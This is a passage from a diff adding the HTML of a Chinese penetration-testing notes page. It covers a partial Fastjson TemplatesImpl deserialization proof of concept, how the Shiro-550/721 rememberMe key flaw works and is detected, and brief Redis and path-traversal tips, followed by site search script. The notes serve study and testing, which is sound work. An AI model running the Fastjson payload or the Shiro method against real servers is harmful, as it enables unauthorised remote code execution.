Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="comment">//System.out.println(EvilCode);</span></span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String GADGAT_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String evil = poc.generateEvil();</span><br><span class="line">        String PoC = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(PoC);</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+
+        <h3 id="6-shiro"   >
+          <a href="#6-shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-shiro" class="headerlink" title="6.shiro"></a>6.shiro</h3>
+      <p>环境搭建：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46127592/article/details/123999749" >(47条消息) shiro debug 调试_scanner010的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>其它参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#e9db1d2a" >Shiro 550 漏洞学习（一） (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/582525812214224" >P神知识星球的TemplatesImpl在Shiro中的利用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<ul>
+<li><p><code>Shiro-550</code>原理：</p>
+<p><code>1.2.4</code>及以下</p>
+<p><code>Apache Shiro</code>框架提供了记住密码功能，登录成功的化会生成经过加密并且编码的<code>Cookie</code>，实际为<code>rememberMe</code>。那么在服务端就会对该<code>Cookie</code>进行<code>base64</code>解码，然后<code>AES</code>解密，最后再反序列化，这样就会导致反序列化的<code>RCE</code>漏洞，而其中<code>AES</code>加解密的<code>KEY</code>是硬编码写在源码中的。</p>
+<p>修复即去掉了默认的<code>key</code></p>
+</li>
+<li><p><code>Shiro-721</code>原理：</p>
+<p>同样也是<code>rememberMe</code>字段，不过需要一个合法的<code>rememberMe</code>字段作为前缀</p>
+</li>
+<li><p>识别：</p>
+<ul>
+<li><code>Remember Me</code>的功能</li>
+<li>抓包的时候在<code>set-cookie</code>中有<code>remeberMe</code>字段</li>
+<li>或者<code>key</code>不同导致的信息回传</li>
+</ul>
+</li>
+<li><p>检测：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=shiroscan</span><br></pre></td></tr></table></div></figure></li>
+<li><p>利用：</p>
+<p>很多种类，用<code>ysoserial</code>吧，需要去掉<code>JSESSIONID</code>字段，具体的可以看看<code>vulhub</code>中讲到的方法。</p>
+</li>
+</ul>
+<p>▲注：</p>
+<p>自己本地调试<code>shiro-550</code>的时候，老是没办法反序列化，执行到反序列化时，即最终的<code>DefaultSerializer.java  -  deserialize</code>函数中就会抛出异常，直接跳转到异常处理去，应该是环境搭建有点问题。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221118112528568.png" alt="image-20221118112528568"></p>
+
+        <h3 id="7-Redis"   >
+          <a href="#7-Redis" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-Redis" class="headerlink" title="7.Redis"></a>7.Redis</h3>
+      <ul>
+<li>端口：6379</li>
+</ul>
+
+        <h1 id="TIPS"   >
+          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
+      
+        <h2 id="1-目录穿越"   >
+          <a href="#1-目录穿越" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-目录穿越" class="headerlink" title="1.目录穿越"></a>1.目录穿越</h2>
+      <p><code>../</code>约等于<code>&#123;.&#125;</code></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/08/14/%E6%B8%97%E9%80%8F/">http://pig-007.github.io/2022/08/14/%E6%B8%97%E9%80%8F/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/08/19/Web%E6%AF%94%E8%B5%9B%E9%A2%98/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">WEB比赛题</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/"><span class="paginator-prev__text">JAVA反序列化CC链笔记</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
+          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">
+          一、信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">
+          1.子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IP%E6%90%9C%E9%9B%86"><span class="toc-text">
+          2.IP搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-C%E6%AE%B5%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">
+          3.C段存活主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">
+          4.其他信息搜集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">
+          二、网站信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">
+          1.网站指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-text">
+          2.敏感文件、目录探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BD%91%E7%AB%99WAF%E8%AF%86%E5%88%AB"><span class="toc-text">
+          3.网站WAF识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-text">
+          三、漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%92%88%E5%AF%B9%E6%80%A7%E6%BC%8F%E6%B4%9E"><span class="toc-text">
+          1.针对性漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-awvs"><span class="toc-text">
+          2.awvs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">
+          四、常见漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-weblogic"><span class="toc-text">
+          1.weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Thinkphp5"><span class="toc-text">
+          2.Thinkphp5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Struts2"><span class="toc-text">
+          3.Struts2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Jboss"><span class="toc-text">
+          4.Jboss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Fastjson"><span class="toc-text">
+          5.Fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-shiro"><span class="toc-text">
+          6.shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Redis"><span class="toc-text">
+          7.Redis</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TIPS"><span class="toc-text">
+          TIPS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">
+          1.目录穿越</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">83</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
